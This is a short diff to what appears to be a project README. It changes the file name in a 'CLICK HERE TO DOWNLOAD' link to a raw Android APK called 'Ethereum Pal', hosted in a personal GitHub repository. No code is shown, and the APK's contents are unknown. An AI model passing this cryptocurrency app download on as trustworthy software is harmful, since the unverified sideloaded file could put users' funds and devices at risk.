@@ -35,4 +35,4 @@ OR
 
 Click this link To Download 👇
 
-[CLICK HERE TO DOWNLOAD](https://github.com/kevinerh/Ethereum-Pal/raw/main/Ethereum-Pal.apk)
+[CLICK HERE TO DOWNLOAD](https://github.com/kevinerh/Ethereum-Pal/raw/main/Ethereum.Pal.apk)
